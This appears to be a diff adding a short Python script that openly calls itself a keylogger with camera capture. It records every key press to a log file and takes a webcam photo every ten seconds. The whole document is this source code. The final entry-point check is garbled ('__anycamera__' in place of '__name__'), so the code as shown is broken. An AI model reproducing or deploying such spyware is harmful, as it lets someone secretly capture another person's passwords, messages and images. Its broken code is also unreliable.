@@ -1,0 +1,51 @@
+import keyboard
+import time
+from datetime import datetime
+import cv2
+import os
+
+# Configuration
+LOG_FILE = "keylog.txt"
+CAMERA_CAPTURE_DIR = "camera_captures"
+CAPTURE_INTERVAL = 10  # Capture image every 10 seconds
+
+def ensure_dir(directory):
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+def log_keystroke(event):
+    with open(LOG_FILE, "a") as f:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        f.write(f"[{timestamp}] Key pressed: {event.name}\n")
+
+def capture_camera():
+    try:
+        cap = cv2.VideoCapture(0)  # 0 for default camera
+        if cap.isOpened():
+            ret, frame = cap.read()
+            if ret:
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                img_path = os.path.join(CAMERA_CAPTURE_DIR, f"capture_{timestamp}.jpg")
+                cv2.imwrite(img_path, frame)
+                print(f"Camera capture saved: {img_path}")
+            cap.release()
+    except Exception as e:
+        print(f"Camera error: {e}")
+
+def main():
+    ensure_dir(CAMERA_CAPTURE_DIR)
+    print("Keylogger + Camera capture started. Press 'ESC' to stop.")
+    keyboard.on_press(log_keystroke)
+
+    last_capture_time = time.time()
+    while True:
+        if keyboard.is_pressed("esc"):
+            print("Stopping...")
+            break
+        if time.time() - last_capture_time >= CAPTURE_INTERVAL:
+            capture_camera()
+            last_capture_time = time.time()
+        time.sleep(0.1)
+
+if __anycamera__ == "__main__":
+    main()
